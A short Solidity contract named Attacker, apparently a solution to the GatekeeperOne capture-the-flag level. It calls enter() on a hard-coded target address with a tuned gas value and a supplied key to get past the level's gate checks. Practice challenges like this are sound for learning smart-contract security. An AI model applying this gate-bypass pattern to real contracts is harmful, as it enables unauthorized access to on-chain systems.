// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperOne {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {

    event Failed(bytes reason, uint256 gas);

    function attack(bytes8 _key) external {
        IGatekeeperOne target = IGatekeeperOne(0xf6A24e5B87e901841e3EfA4dBD0b4975153Db105);

        uint256 gas = 106739;
        target.enter{gas:gas}(_key);
    }
}